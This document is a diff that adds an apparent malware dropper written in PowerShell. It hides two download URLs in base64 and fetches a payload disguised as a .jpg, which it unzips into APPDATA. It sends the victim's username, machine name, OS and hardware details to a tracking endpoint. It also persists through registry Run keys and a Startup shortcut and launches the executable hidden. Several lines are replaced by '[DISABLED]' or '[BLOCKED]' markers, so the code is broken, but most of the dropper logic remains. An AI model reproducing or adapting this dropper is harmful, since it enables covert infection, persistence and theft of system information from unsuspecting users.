@@ -1,0 +1,142 @@
+﻿
+$lFNskEODF = 'LvVzSDAJry';
+$VXMIYtquRtqgBF = $false;
+$mtx = New-Object System.Threading.Mutex($true, $lFNskEODF, [ref]$VXMIYtquRtqgBF);
+if(-not $VXMIYtquRtqgBF){exit}
+$QTepOGdn = [guid]::NewGuid().ToString();
+$aKDcLTLzCr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly92cGxheWVyLmNsL2Fra3NzZXJpdmNzZXNvc29zcHFzZi5qcGc='));
+$EctrWgSLoomAxne = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9ic3Ryc3YuY29tL21hb3NpdHF3amFzZmE='));
+$VhPjluQffeW = "$env:TEMP\\kBLUHGub.jpg";
+$afnXjfrPAsB = "$env:APPDATA\\kBLUHGub\\";
+try {md $afnXjfrPAsB -ea 0 | Out-Null} catch {}
+try {
+    $w = # [DISABLED] Download attempt
+    $w.open('GET', $aKDcLTLzCr, $false)
+    $w.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+    $w.send()
+    $a = [byte[]]$w.responseBody
+    [Write-Host "[BLOCKED] File write attempt"($VhPjluQffeW, $a)
+    Rename-Item $VhPjluQffeW ($VhPjluQffeW -replace '.jpg','.zip')
+    $zip = ($VhPjluQffeW -replace '.jpg','.zip')
+    Add-Type -A 'System.IO.Compression.FileSystem'
+    [IO.Compression.ZipFile]::ExtractToDirectory($zip, $afnXjfrPAsB)
+    Remove-Item $zip -force
+
+    $osver = [System.Environment]::OSVersion.VersionString
+    $osname = (Get-WmiObject Win32_OperatingSystem).Caption
+    $cs = Get-WmiObject Win32_ComputerSystem
+    $pcmodel = $cs.Model
+    $pcmanuf = $cs.Manufacturer
+
+    $url = "DISABLED_URL?id=$($QTepOGdn)&s=unzip_ok" +
+        "&user=$env:USERNAME" +
+        "&pc=$env:COMPUTERNAME" +
+        "&cwd=$afnXjfrPAsB" +
+        "&osver=$osver" +
+        "&osname=$([uri]::EscapeDataString($osname))" +
+        "&pcmodel=$([uri]::EscapeDataString($pcmodel))" +
+        "&pcmanuf=$([uri]::EscapeDataString($pcmanuf))"
+    iwr $url -UseBasicParsing
+} catch {
+    $url = "DISABLED_URL?id=$($QTepOGdn)&s=unzip_fail&msg=$($_)" +
+        "&user=$env:USERNAME" +
+        "&pc=$env:COMPUTERNAME" +
+        "&cwd=$afnXjfrPAsB"
+    iwr $url -UseBasicParsing
+}
+$e = Get-ChildItem -Path $afnXjfrPAsB -Filter *.exe -Recurse | Select-Object -First 1
+if ($null -eq $e) {
+    $url = "DISABLED_URL?id=$($QTepOGdn)&s=run_fail&msg=EXE_NOT_FOUND" +
+        "&user=$env:USERNAME" +
+        "&pc=$env:COMPUTERNAME" +
+        "&cwd=$afnXjfrPAsB"
+    iwr $url -UseBasicParsing
+    exit
+}
+$p = $e.FullName
+$exeDir = Split-Path -Path $p -Parent
+$osver = [System.Environment]::OSVersion.VersionString
+$osname = (Get-WmiObject Win32_OperatingSystem).Caption
+$cs = Get-WmiObject Win32_ComputerSystem
+$pcmodel = $cs.Model
+$pcmanuf = $cs.Manufacturer
+$autostartCmd = "powershell -WindowStyle Hidden -Command `"Write-Host "[BLOCKED] Attempted process execution" -FilePath `"$($p)`" -WorkingDirectory `"$($exeDir)`" -WindowStyle Hidden`""
+try {
+    # [DISABLED] Registry persistence attempt' -Name ('up'+$QTepOGdn.Substring(0,4)) -Value $autostartCmd
+    $url = "DISABLED_URL?id=$($QTepOGdn)&s=autorun_run_ok" +
+        "&user=$env:USERNAME" +
+        "&pc=$env:COMPUTERNAME" +
+        "&cwd=$exeDir" +
+        "&osver=$osver" +
+        "&osname=$([uri]::EscapeDataString($osname))" +
+        "&pcmodel=$([uri]::EscapeDataString($pcmodel))" +
+        "&pcmanuf=$([uri]::EscapeDataString($pcmanuf))"
+    iwr $url -UseBasicParsing
+} catch {
+    $url = "DISABLED_URL?id=$($QTepOGdn)&s=autorun_run_fail&msg=$($_)" +
+        "&user=$env:USERNAME" +
+        "&pc=$env:COMPUTERNAME" +
+        "&cwd=$exeDir"
+    iwr $url -UseBasicParsing
+}
+try {
+    # [DISABLED] Registry persistence attemptOnce' -Name ('uo'+$QTepOGdn.Substring(0,4)) -Value $autostartCmd
+    $url = "DISABLED_URL?id=$($QTepOGdn)&s=autorun_runonce_ok" +
+        "&user=$env:USERNAME" +
+        "&pc=$env:COMPUTERNAME" +
+        "&cwd=$exeDir" +
+        "&osver=$osver" +
+        "&osname=$([uri]::EscapeDataString($osname))" +
+        "&pcmodel=$([uri]::EscapeDataString($pcmodel))" +
+        "&pcmanuf=$([uri]::EscapeDataString($pcmanuf))"
+    iwr $url -UseBasicParsing
+} catch {
+    $url = "DISABLED_URL?id=$($QTepOGdn)&s=autorun_runonce_fail&msg=$($_)" +
+        "&user=$env:USERNAME" +
+        "&pc=$env:COMPUTERNAME" +
+        "&cwd=$exeDir"
+    iwr $url -UseBasicParsing
+}
+try {
+    $WshShell = New-Object -ComObject WScript.Shell
+    $lnk = $env:APPDATA + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + $QTepOGdn.Substring(0,5) + '.lnk'
+    $shortcut = $WshShell.CreateShortcut($lnk)
+    $shortcut.TargetPath = $p
+    $shortcut.WorkingDirectory = $exeDir
+    $shortcut.WindowStyle = 7
+    $shortcut.Save()
+    $url = "DISABLED_URL?id=$($QTepOGdn)&s=autorun_shortcut_ok" +
+        "&user=$env:USERNAME" +
+        "&pc=$env:COMPUTERNAME" +
+        "&cwd=$exeDir" +
+        "&osver=$osver" +
+        "&osname=$([uri]::EscapeDataString($osname))" +
+        "&pcmodel=$([uri]::EscapeDataString($pcmodel))" +
+        "&pcmanuf=$([uri]::EscapeDataString($pcmanuf))"
+    iwr $url -UseBasicParsing
+} catch {
+    $url = "DISABLED_URL?id=$($QTepOGdn)&s=autorun_shortcut_fail&msg=$($_)" +
+        "&user=$env:USERNAME" +
+        "&pc=$env:COMPUTERNAME" +
+        "&cwd=$exeDir"
+    iwr $url -UseBasicParsing
+}
+try {
+    Write-Host "[BLOCKED] Attempted process execution" -FilePath $p -WorkingDirectory $exeDir -WindowStyle Hidden
+    $url = "DISABLED_URL?id=$($QTepOGdn)&s=run_ok" +
+        "&user=$env:USERNAME" +
+        "&pc=$env:COMPUTERNAME" +
+        "&cwd=$exeDir" +
+        "&osver=$osver" +
+        "&osname=$([uri]::EscapeDataString($osname))" +
+        "&pcmodel=$([uri]::EscapeDataString($pcmodel))" +
+        "&pcmanuf=$([uri]::EscapeDataString($pcmanuf))"
+    iwr $url -UseBasicParsing
+} catch {
+    $url = "DISABLED_URL?id=$($QTepOGdn)&s=run_fail&msg=$($_)" +
+        "&user=$env:USERNAME" +
+        "&pc=$env:COMPUTERNAME" +
+        "&cwd=$exeDir"
+    iwr $url -UseBasicParsing
+}
+
